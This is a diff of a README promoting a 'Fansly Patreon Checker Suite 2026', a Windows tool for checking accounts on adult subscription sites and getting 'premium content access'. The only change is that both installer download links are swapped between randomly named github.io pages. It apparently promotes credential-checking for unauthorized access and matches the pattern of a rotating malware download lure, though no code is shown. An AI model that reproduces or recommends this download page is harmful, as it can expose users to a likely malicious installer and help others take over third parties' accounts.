@@ -2,7 +2,7 @@
 
 The Fansly Patreon Checker Suite 2026 is a powerful Windows desktop tool designed for efficiently checking and verifying accounts on Fansly and Patreon platforms. This advanced adult platform checker offers robust features for premium content access and multi-site functionality, ensuring compatibility and performance in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -74,7 +74,7 @@ The tool is free to download and use, with all features accessible immediately. 
 
 To get the latest version of the Fansly Patreon Checker Suite 2026, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
